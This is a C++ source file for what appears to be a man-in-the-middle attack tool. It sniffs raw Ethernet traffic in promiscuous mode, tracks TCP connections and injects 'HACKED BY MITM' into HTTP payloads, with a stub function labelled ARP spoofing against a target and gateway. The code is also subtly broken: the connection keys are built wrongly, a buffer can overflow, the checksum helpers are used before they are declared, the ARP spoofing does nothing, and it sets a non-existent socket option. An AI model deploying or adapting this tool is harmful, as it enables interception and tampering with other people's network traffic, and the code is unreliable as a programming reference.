#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <signal.h>
#include <pthread.h>
#include <map>

#define ETH_HDR_LEN 14
#define IP_HDR_LEN 20
#define TCP_HDR_LEN 20
#define BUFFER_SIZE 65536

struct Connection {
    uint32_t client_ip, server_ip;
    uint16_t client_port, server_port;
    int sock_fd;
};

std::map<uint64_t, Connection> connections;
pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;

uint64_t get_connection_key(uint32_t src_ip, uint16_t src_port, uint32_t dst_ip, uint16_t dst_port) {
    return ((uint64_t)src_ip << 32) | ((uint64_t)src_port << 16) | ((uint16_t)dst_ip << 16) | dst_port;
}

void handle_packet(u_char* buffer, int len, int sockfd, struct sockaddr_ll* from) {
    struct ethhdr* eth = (struct ethhdr*)buffer;
    if (eth->h_proto != htons(ETH_P_IP)) return;
    
    struct iphdr* ip = (struct iphdr*)(buffer + ETH_HDR_LEN);
    if (ip->protocol != IPPROTO_TCP) return;
    
    struct tcphdr* tcp = (struct tcphdr*)(buffer + ETH_HDR_LEN + (ip->ihl * 4));
    
    uint32_t src_ip = ntohl(ip->saddr);
    uint32_t dst_ip = ntohl(ip->daddr);
    uint16_t src_port = ntohs(tcp->source);
    uint16_t dst_port = ntohs(tcp->dest);
    
    uint64_t key = get_connection_key(src_ip, src_port, dst_ip, dst_port);
    uint64_t rev_key = get_connection_key(dst_ip, dst_port, src_ip, src_port);
    
    pthread_mutex_lock(&conn_mutex);
    
    auto it = connections.find(key);
    if (it == connections.end()) {
        it = connections.find(rev_key);
    }
    
    if (it != connections.end()) {
        char* payload = (char*)(buffer + ETH_HDR_LEN + (ip->ihl * 4) + (tcp->doff * 4));
        int payload_len = len - (ETH_HDR_LEN + (ip->ihl * 4) + (tcp->doff * 4));
        
        if (payload_len > 0 && strstr(payload, "HTTP") != NULL) {
            memmove(payload + 12, payload, payload_len);
            memcpy(payload, "HACKED BY MITM", 12);
            
            tcp->check = 0;
            ip->check = 0;
            
            uint32_t pseudo_header[12];
            pseudo_header[0] = ip->saddr;
            pseudo_header[1] = ip->daddr;
            pseudo_header[2] = htons(IPPROTO_TCP);
            pseudo_header[3] = htons(ntohs(ip->tot_len) - (ip->ihl * 4));
            
            tcp->check = ~htons(ntohs(~tcp_checksum((unsigned short*)pseudo_header, 
                (unsigned short*)tcp, ntohs(ip->tot_len) - (ip->ihl * 4))));
            
            ip->check = ~htons(ntohs(~ip_checksum((unsigned short*)ip, ip->ihl * 4)));
        }
        
        sendto(sockfd, buffer, len, 0, (struct sockaddr*)from, sizeof(*from));
    } else {
        Connection conn = {src_ip, dst_ip, src_port, dst_port, -1};
        connections[key] = conn;
        
        sendto(sockfd, buffer, len, 0, (struct sockaddr*)from, sizeof(*from));
    }
    
    pthread_mutex_unlock(&conn_mutex);
}

unsigned short ip_checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = ~sum;
    return (answer);
}

unsigned short tcp_checksum(unsigned short *ptr, unsigned short *tcp_ptr, int tcp_len) {
    register long sum;
    sum = 0;
    
    sum += *ptr++; sum += *ptr++; sum += *ptr++; sum += *ptr++;
    ptr += 4; // Skip reserved + protocol + TCP length
    
    while (tcp_len > 1) {
        sum += *tcp_ptr++;
        tcp_len -= 2;
    }
    if (tcp_len == 1) {
        sum += *(u_char*)tcp_ptr;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void* packet_capture(void* arg) {
    int sockfd = *(int*)arg;
    u_char buffer[BUFFER_SIZE];
    struct sockaddr_ll from;
    socklen_t fromlen = sizeof(from);
    
    while (1) {
        int len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&from, &fromlen);
        if (len > 0) {
            handle_packet(buffer, len, sockfd, &from);
        }
    }
    return NULL;
}

void arp_spoof(const char* interface, const char* target_ip, const char* gateway_ip) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ioctl(sockfd, SIOCGIFINDEX, &ifr);
    
    printf("[+] ARP spoofing %s -> %s\n", target_ip, gateway_ip);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <interface> [target_ip]\n", argv[0]);
        printf("Example: %s eth0 192.168.1.100\n", argv[0]);
        return 1;
    }
    
    const char* interface = argv[1];
    
    struct ifreq ifr;
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ioctl(sockfd, SIOCGIFINDEX, &ifr);
    
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    
    if (bind(sockfd, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("bind");
        return 1;
    }
    
    int val = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_PROMISCUOUS, &val, sizeof(val));
    
    printf("[+] MITM proxy started on %s\n", interface);
    printf("[+] Capturing and modifying TCP traffic...\n");
    
    if (argc == 3) {
        arp_spoof(interface, argv[2], "192.168.1.1");
    }
    
    // Start packet capture thread
    pthread_t capture_thread;
    pthread_create(&capture_thread, NULL, packet_capture, &sockfd);
    
    pthread_join(capture_thread, NULL);
    
    close(sockfd);
    return 0;
}